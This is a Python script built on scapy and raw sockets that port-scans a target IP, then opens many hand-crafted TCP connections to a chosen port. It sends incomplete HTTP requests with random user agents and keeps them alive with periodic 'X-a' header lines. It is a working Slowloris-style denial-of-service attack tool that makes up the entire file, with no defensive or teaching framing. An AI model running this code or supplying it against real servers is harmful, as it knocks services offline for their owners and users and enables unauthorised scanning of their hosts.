print('Preparation: Import libraries...')
import TCPackets
import Sniffer_TCP
import socket
import random
import asyncio
import time
from scapy.all import *

try:
	dst_ip = sys.argv[1]
except:
	dst_ip = input('Enter IP: ')

#src_ip = ''
#dst_ip = ''
connections = []

p = IP(dst=dst_ip)/TCP(dport=8888, flags='S')
r = sr1(p, verbose=False)
src_ip = str(r[0].dst)
sniffer = Sniffer_TCP.Sniffer(src_ip)
print('Your ip: {}'.format(src_ip))


user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]

def ports_scanner(dst_ip):
	print('Scanning open ports at {}...'.format(dst_ip))
	open_ports = list()
	packet = IP(dst=dst_ip)/TCP(dport=(1,443),flags='S')
	res, unans = sr(packet, timeout=10, verbose=False)
	for i in res:
		if i[1][1].flags == 18:
			open_ports.append(i[1].sport)
			packet = IP(dst=dst_ip)/TCP(dport=i[1][1].sport,flags='R')
			send(packet, verbose=False)

	if open_ports:
		print('Open ports on {}: {}\n'.format(dst_ip, open_ports))
	else:
		print('Host {} has no open ports.'.format(dst_ip))
	return open_ports

def free_ports_init():
	free_ports = list()
	for i in range(65535):
		free_ports.append(i)
	return free_ports

free_ports = free_ports_init()

class Connection():
	def __init__(self, src_ip, src_port, ack, seq):
		self.src_ip = src_ip
		self.src_port = src_port
		self.ack = ack
		self.seq = seq


async def send_syn():
	global src_ip
	global dst_ip
	global dst_port
	global quantity_of_connections
	global free_ports
	global sniffer

	
	open_ports = ports_scanner(dst_ip)
	
	while True:
		dst_port = int(input('Which one (port)? '))
		if dst_port not in open_ports:
			print('{} is not open. Choose from: {}'.format(dst_port, open_ports))
		else:
			break

	t = time.time()

	s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
	flags = 0b0000010 #SYN flag
	src_port = random.choice(free_ports)
	free_ports.remove(src_port)

	packet = TCPackets.TCPPacket(src_ip, src_port, dst_ip, dst_port, flags)
	sniffer.ip = src_ip

	x = int(input('How many connections? '))
	t = time.time()
	for i in range(x):
		s.sendto(packet.build(), (dst_ip, dst_port))
		packet.seq = random.randint(0, 4294967295)
		src_port = random.choice(free_ports)
		free_ports.remove(src_port)
		packet.src_port = src_port
		await asyncio.sleep(0.01)
	print('{} connections were made in {}'.format(x, time.time() - t))


async def connect():

	global sniffer
	global src_ip
	global dst_ip
	global dst_port
	global connections
	global user_agents
	global free_ports

	ports = list()

	s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)

	while True:

		if sniffer.TCP_stack:

			response_packet = sniffer.TCP_stack[0]

			if (response_packet.flags['S'] and response_packet.flags['A']) and (response_packet.dst_port not in ports):
				flags = 0b00010000 #ACK flag
				packet = TCPackets.TCPPacket(src_ip, response_packet.dst_port, dst_ip, dst_port, flags)
				packet.seq = response_packet.ack
				packet.ack = response_packet.seq + 1

				s.sendto(packet.build(), (dst_ip, dst_port))
				ports.append(packet.src_port)

				packet = IP(dst=dst_ip)/TCP(sport=response_packet.dst_port, dport=dst_port, flags='PA', seq=response_packet.ack, ack=response_packet.seq+1)
				
				data = ('GET /?{} HTTP/1.1\r\n'.format(random.randint(0, 2000)) + 'User-Agent: {}\r\n'.format(random.choice(user_agents)) + "{}\r\n".format("Accept-language: en-US,en,q=0.5"))
								
				send(packet/data, verbose=False)
				con = Connection(src_ip, response_packet.dst_port, response_packet.seq, response_packet.ack + len(data))
				connections.append(con)
				

			elif response_packet.flags['F']:

				packet = IP(dst=dst_ip)/TCP(sport=response_packet.dst_port, dport=dst_port, flags='A', seq=response_packet.ack, ack=response_packet.seq+1)
				send(packet, verbose=False)
				
				if response_packet.dst_port in ports:				
					connections.pop(ports.index(response_packet.dst_port))
					ports.remove(response_packet.dst_port)				
				
				src_port = random.choice(free_ports)
				free_ports.remove(src_port)
				packet = TCPackets.TCPPacket(src_ip, src_port, dst_ip, dst_port, 0b00000010)
				packet.seq = random.randint(0, 4294967295)
				s.sendto(packet.build(), (dst_ip, dst_port))
				
			sniffer.TCP_stack.pop(0)

		await asyncio.sleep(0)

async def keep_connection_open():

	global connections
	global src_ip
	global dst_ip
	global dst_port
	
	while True:
		if len(connections) != 0:
			print('-------- {} CONNECTIONS KEEPING OPEN---------'.format(len(connections)))

		t = time.time()
		
		for conn in connections:
			packet = IP(dst=dst_ip)/TCP(sport=conn.src_port, dport=dst_port, flags='A', seq=conn.seq, ack=conn.ack)
			data = ('X-a: {}\r\n'.format(random.randint(0, 5000)))
			send(packet/data, verbose=False)
			conn.seq += len(data)
			await asyncio.sleep(0)

		if len(connections) != 0:
			print('In time: {}'.format(time.time() - t))

		await asyncio.sleep(10)
		
		
		
				

async def main_loop():
	global sniffer
	t1 = asyncio.create_task(send_syn())
	t2 = asyncio.create_task(connect())
	t3 = asyncio.create_task(sniffer.sniff())
	t4 = asyncio.create_task(keep_connection_open())


	await asyncio.gather(t1, t2, t3, t4)


asyncio.run(main_loop())




